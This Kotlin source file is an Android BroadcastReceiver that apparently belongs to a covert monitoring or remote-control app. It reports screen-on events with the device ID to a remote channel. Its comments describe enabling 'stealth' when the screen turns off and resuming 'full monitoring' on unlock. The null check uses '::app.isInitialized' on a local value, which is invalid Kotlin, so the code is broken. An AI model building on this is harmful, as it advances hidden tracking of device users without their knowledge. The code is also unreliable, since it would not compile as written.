// ============================================================
// FILE: android/app/src/main/java/com/xrc/receivers/ScreenStateReceiver.kt
// ============================================================
package com.xrc.receivers

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.util.Log
import com.xrc.XrcApplication

/**
 * ScreenStateReceiver — monitors screen on/off and user unlock events.
 *
 * On screen-on — starts heartbeat acceleration
 * On screen-off — marks idle state, enables stealth
 * On user-present — resumes full monitoring
 */
class ScreenStateReceiver : BroadcastReceiver() {
    companion object {
        private const val TAG = "ScreenStateReceiver"
    }

    private var lastState = "unknown"

    override fun onReceive(context: Context, intent: Intent) {
        val action = intent.action ?: return
        Log.d(TAG, "Screen state: $action")

        when (action) {
            Intent.ACTION_SCREEN_ON -> {
                lastState = "on"
                onScreenOn()
            }
            Intent.ACTION_SCREEN_OFF -> {
                lastState = "off"
                onScreenOff()
            }
            Intent.ACTION_USER_PRESENT -> {
                lastState = "unlocked"
                onUserPresent()
            }
        }
    }

    private fun onScreenOn() {
        // Report device wake
        val app = XrcApplication.instance
        if (::app.isInitialized) {
            val deviceId = com.xrc.core.crypto.Identity.getDeviceId(app)
            val msg = com.xrc.comms.Message(
                type = com.xrc.comms.Protocol.TYPE_SENSOR_DATA,
                id = "screen_on_${System.currentTimeMillis()}",
                device_id = deviceId,
                payload = "{\"event\":\"screen_on\",\"ts\":${System.currentTimeMillis()}}"
            )
            app.serviceLocator.channelClient.send(msg)
        }
    }

    private fun onScreenOff() {
        // Could reduce resource usage during screen off
    }

    private fun onUserPresent() {
        // User unlocked device - resume normal operation
    }
}
